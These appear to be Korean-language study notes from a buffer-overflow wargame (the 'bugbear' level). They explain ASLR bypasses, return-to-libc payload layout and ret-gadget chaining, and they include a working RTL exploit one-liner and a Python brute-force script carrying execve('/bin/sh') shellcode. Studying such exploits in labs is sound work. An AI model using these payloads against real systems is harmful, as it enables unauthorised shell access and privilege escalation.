'''
*system함수의 libc주소를 알아 내기
 - gdb 실행중에 info proc mappings
 - ldd 명령어
 - gdb에서 프로세스 시작후 print system

*ASLR(Address Space Layout Randomization) 우회
 - ulimit -s unlimited <= 스택의 한도가 최대치가 되서 주소를 고정시킴(32bit)

 - printf 같은 함수의 인자를 조작해서 스택이나 got, bss등의 영역을 출력 하도록 함.
 ex).read함수의 got 값을 출력하도록 하면 libc의 read주소가 나올것이고 read 함수가 libc의 base address로 부터 어느 offset에 있는지를 계산하면 libc base address를 구할 수 있음.
  =>내가 원하는 함수(system,execl)의 주소를 구할 수 있음.

 - setarch 아키텍처(linux32) -R <= suid나 guid는 주소가 고정이 되지 않음
 
'''

#ROP기법 => RTL(Return To Libc)
# ret 주소를 libc 공유 라이브러리의 함수로 덮어 씌움

# BUF + SFP[4] + RET[4](System) + 다음RET[4] + /BIN/SH[4]

# print system 으로 시스템 주소 구하기.

# find &system,+999999999,"/bin/sh" 으로 /bin/sh 주소를 알수 있음



                                /bin/sh 주소찾기
#include<stdio.h>
void main()
{
        char s[8]="/bin/sh"
        int shell=0x40058ae0;           <-system libc 주소
        while(memcmp((void*)shell, s, sizeof(s)))
                shell++;
        printf("address : 0x%x \n",shell);
}


===> ./bugbear `python -c 'print "a"*44+"\xe0\x8a\x05\x40"+"\xe0\x91\x03\x40"+"\xf9\xbf\x0f\x40"'`


#==========================================================================


#ret가젯을 사용한 풀이!
#ret = pop eip -> jmp eip    <=이 원리를 이용
#ret가젯을 이용해 그 다음 영역을 리턴주소로 참조하게 만들어서 쉘코드 실행.

import sys,os,struct

target=os.getcwd()+"/"+sys.argv[1]

retadd=0x80484a7

shell="\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

for h in range(0xff,0x00,-1):
	for l in range(0x00,0x10,10):
		payload="a"*44+struct.pack('<L',retadd)+struct.pack('<L',retadd)+struct.pack('<L',retadd)
		payload=payload+chr(l)+chr(h)+"\xff\xbf"
		pid = os.fork()
		if pid==0:
			os.execl(target,target,payload,shell)
		else:
			os.waitpid(pid,0)
